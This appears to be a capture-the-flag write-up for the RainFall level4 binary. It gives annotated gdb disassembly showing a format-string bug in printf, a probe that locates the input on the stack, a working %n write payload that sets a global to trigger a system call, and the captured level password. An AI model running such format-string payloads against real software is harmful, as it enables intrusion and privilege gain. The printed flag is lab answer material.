# Level4

```nasm
(gdb) disas main
Dump of assembler code for function main:                         // Main function only calls n
   0x080484a7 <+0>:     push   ebp
   0x080484a8 <+1>:     mov    ebp,esp
   0x080484aa <+3>:     and    esp,0xfffffff0
   0x080484ad <+6>:     call   0x8048457 <n>           
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
```

```nasm
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218                       // Allocate a 0x218 (536) bytes stack
   0x08048460 <+9>:     mov    eax,ds:0x8049804                // Move stdin in eax
   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax         // Put that as third argument
   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200       // Put 0x200 as second argument (512)
   0x08048471 <+26>:    lea    eax,[ebp-0x208]                 // Put 520 bytes of the stack in eax
   0x08048477 <+32>:    mov    DWORD PTR [esp],eax             // Put that as first argument
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>           // Call fgets
   0x0804847f <+40>:    lea    eax,[ebp-0x208]                 // Load the top 520 bytes of the stack in eax
   0x08048485 <+46>:    mov    DWORD PTR [esp],eax             // Put that as first argument
   0x08048488 <+49>:    call   0x8048444 <p>                   // Call p
   0x0804848d <+54>:    mov    eax,ds:0x8049810                // Put whatever is at 0x8049810
   0x08048492 <+59>:    cmp    eax,0x1025544                   // Compare that with 0x1025544 (16930116)
   0x08048497 <+64>:    jne    0x80484a5 <n+78>                // If not equal, leave
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590       // Put on top of the stack the string "/bin/cat /home/user/level5/.pass"
   0x080484a0 <+73>:    call   0x8048360 <system@plt>          // Then call system !
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
```

```nasm
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18                         // Allocate 24 bytes on the stack
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]          // Move into eax 8 bytes of the stack
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax              // Put that on top
   0x08048450 <+12>:    call   0x8048340 <printf@plt>           // Then call printf
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

We have a `fgets`, a `printf` and a `cmp` that triggers a `system` call, this looks very familiar… We can probably do the same thing as in level3

So once again we try to find where in memory (relatively to the address `0x8049810` ) we need to put 16930116 in order to trigger the comparison :

```nasm
level4@RainFall:~$ echo -e "\x10\x98\x04\x08AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
AAAAb7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810 41414141 25207825
```

We can see that our “payload” AAAA is at the 13th position as 41414141

So we simply need to change the payload from AAAA to 16930116 at the right position :

```bash
 (echo -e "\x10\x98\x04\x08%16930112c%12\$n"; cat) | ./level4
```

And after a while (the time to write 16930116 characters), we get the password : 
**0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a**